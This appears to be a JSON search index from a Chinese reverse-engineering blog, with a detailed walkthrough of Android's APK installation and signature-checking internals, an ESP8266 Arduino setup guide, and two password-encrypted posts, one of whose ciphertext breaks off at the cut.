[{"title":"iOS中LLDB反反调试分析与实现","date":"2019-08-12T11:16:01.000Z","path":"2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/","text":"Need password to decrypt! Incorrect Password! No content to display! U2FsdGVkX1+Wa1uSaOE4zi5RHvjz+Rmslb9jYYvuhJI=","tags":[]},{"title":"Android应用安装过程深度解析","date":"2019-08-01T07:08:31.000Z","path":"2019/08/01/android-apk-install-process/android-apk-install-process/","text":"Android应用安装过程深度解析 本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。 开始关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。 整体流程一个 Android 应用安装到手机上大致分为四种情形： 系统应用，在设备每次启动时完成安装 通过 adb install 命令安装 应用市场安装，封装安装过程（略） 第三方应用安装或双击安装包，会启动系统应用引导安装 无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。 场景一：系统应用安装在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。 补充：system_server 的启动与运行流程 system_server 由 zygote 进程孵化，是整个 Android Framework 的基础 zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信 RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法 SystemServer 的 run() 方法中会完成以下工作： 设置时间、语言等，设置虚拟机库文件，设置内存 Looper.prepareMainLooper() 主线程 looper 运行在当前线程 加载库文件 android_servers，位于 /frameworks/base/services createSystemContext() 初始化系统上下文 SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中 启动各种系统服务，包括引导服务、核心服务、其他服务 开启循环，等待其他线程通过 handler 发送消息到主线程来处理 在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService PackageManagerService 类构造函数中完成了许多工作，主要包含： 创建 Settings 对象，添加系统的 SharedUser 信息 为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的 创建 PackageDexOptimizer 和 DexManager 对象 获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures 创建 ServiceThread 和 PackagerHandler 对象 创建 UserManagerService，支持多用户 读取系统定义的权限保存到 permConfig 变量中 读取系统共享库保存到 libConfig 变量中 解析 package.xml 文件中的内容保存到 ArrayMap 结构中 配置扫描参数 scanFlags 开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app 开始扫描非系统应用，包括目录 /data/app、/data/app-private 启动内存垃圾回收 启动私有服务 PackageManagerInternal 总结来说主要是这几项内容： 创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接 扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理） 创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求 解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射 详细说明各项： Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。 Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。 构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量 重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接 connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中 Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装 !!!! Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现 PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理 PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk 包括： 系统应用，目录有 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app 非系统应用，目录有 /data/app、/data/app-private 调用的方法是 scanDirTracedLI() 可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI() 其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理 后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等 场景二：adb 命令安装adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建 源码路径为：http://androidxref.com/8.1.0_r33/xref/system/core/adb/ adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。 Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。 runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。 PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。 发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。 PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。 场景三：第三方应用安装当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作 PackageInstaller 的应用代码位于：http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/ 安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件 应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。 然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。 用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。 InstallInstalling 这个类会拿到应用数据开启真正的安装流程。 首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。 接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。 最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去 这里就跟 adb 安装走到了同一个流程中。 深入 PMS 中的安装上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法 在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。 所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。 1、处理 INIT_COPY 消息 首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。 2、处理 MCS_BOUND 消息 首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。 HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中， InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法 以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制 HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息 installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法 其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看 installNewPackageLI() 流程 installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF() 3、处理 POST_INSTALL 消息 首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等 安装过程小结与应用相关的一些目录 /system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力 /system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用 /data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下 /data/data：用户应用数据存放路径，存在沙箱隔离 /data/dalvik-cache：存放应用的dex 文件 /data/system：存放应用安装相关文件 packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表 package.list 指定应用的默认存储位置，userid 等 应用安装过程总结 将应用 apk 拷贝到指定目录下 解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/ 数据目录 解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中 由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上 PMS 与 PM 与APM前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类 通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象 ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理 继续梳理一下这个类与 PMS 之间的关系 IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法 IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象 asBinder() 方法返回自身，即 IPackageManager.Stub 对象 重写了 onTransact() 方法，根据命令类型处理数据传输 IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口 mRemote对象是IBinder类型，是对IPackageManager.Stub的引用 重写了asBinder()方法，返回mRemote 实现了AIDL文件定义的接口 PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能： 安装/卸载/更新应用，包括 installPackage/ 查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表 查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象 查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象 增加/删除权限，包括 addPermission/removePermission 清除用户数据/缓存/代码等 PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集 ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法 PackageManagerService 继承了 IPackageManager.Stub 因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法 参考 http://androidxref.com/8.1.0_r33/xref/ https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6 http://solart.cc/2016/10/30/install_apk/ https://www.jianshu.com/p/4f16421d5c7f","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"Android","slug":"Android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"}]},{"title":"Arduino ESP8266开发板上手实践","date":"2019-07-30T02:46:35.000Z","path":"2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/","text":"Arduino ESP8266开发板上手实践环境搭建（macOS）官方说明：https://github.com/esp8266/Arduino 安装IDE （Arduino IDE） 下载地址：https://www.arduino.cc/en/main/software 还有种方式是利用Makefile去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。 下载ESP8266硬件包 1 、在设置里面的附加板管理器网址中增加以下链接https://arduino.esp8266.com/stable/package_esp8266com_index.json 2、在工具中找到你的开发板，然后进入开发板管理器，搜索esp8266安装该库，我这里已经安装了。 注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考这里 运行示例代码 我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。 代码如下 /* ESP8266 Blink by Simon Peter Blink the blue LED on the ESP-01 module This example code is in the public domain The blue LED on the ESP-01 module is connected to GPIO1 (which is also the TXD pin; so we cannot use Serial.print() at the same time) Note that this sketch uses LED_BUILTIN to find the pin with the internal LED */ void setup() { pinMode(LED_BUILTIN, OUTPUT); // Initialize the LED_BUILTIN pin as an output } // the loop function runs over and over again forever void loop() { digitalWrite(LED_BUILTIN, LOW); // Turn the LED on (Note that LOW is the voltage level // but actually the LED is on; this is because // it is active low on the ESP-01) delay(1000); // Wait for a second digitalWrite(LED_BUILTIN, HIGH); // Turn the LED off by making the voltage HIGH delay(2000); // Wait for two seconds (to demonstrate the active low LED) } 在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。 重要！！！一些坑以及注意点下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。 确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。 1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。下载地址1 下载地址2 下载地址3在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。 2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过Virtual COM Port去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的/dev目录下并没有出现对应的文件。之前的驱动大多是这个CH340G CH34G CH34X Mac OS X driver 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在这里。安装完以后在/dev就应该有一个tty.SLAB_USBtoUART的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。 资源链接这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下 https://www.arduino.cc/en/guide/macOSX?setlang=cn 在Mac OS X系统上入门Arduino/ Genuino https://juejin.im/post/5b569026e51d4513ee6dd509 Esp8266+Arduino+Mac开发环境搭建 https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/ Program an ESP8266 from Arduino on MacOS https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver CH340G CH34G CH34X Mac OS X driver http://www.nodemcu.com 资料下载访问官网 https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg NODEMCU资料 http://www.wch.cn/download/CH341SER_MAC_ZIP.html mac串口驱动下载地址 https://freeware.the-meiers.org/ CoolTerm串口监控工具下载 SIP禁用步骤 1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r 2. 终端中输入csrutil disable/status/enabled 3. 重启mac AVR逆向基础下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。 由于我们主要是研究iOT逆向，所以可能不会关注在实际开发上面。这里先学习下Arduino上面的执行文件格式，以及指令架构等。 我们通常说的Arduino上面就运行的是一个AVR指令架构的处理器。 AVR refers to the line of MCUs manufactured by Atmel and used in the original designs. 由于ida对这个执行文件的支持不是很好，我们准备用radare2来分析这个bin文件。 参考 https://blog.csdn.net/iotisan/article/details/78766463 和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路 https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/ Any NodeMCU esp8266 Drivers for MacOS Mojave?","tags":[{"name":"Arduino","slug":"Arduino","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"},{"name":"IOT","slug":"IOT","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"}]},{"title":"Electron跨平台App实战分析","date":"2019-07-29T03:59:49.000Z","path":"2019/07/29/Electron-app-reversing/Electron-app-reversing/","text":"Need password to decrypt! Incorrect Password! No content to display! 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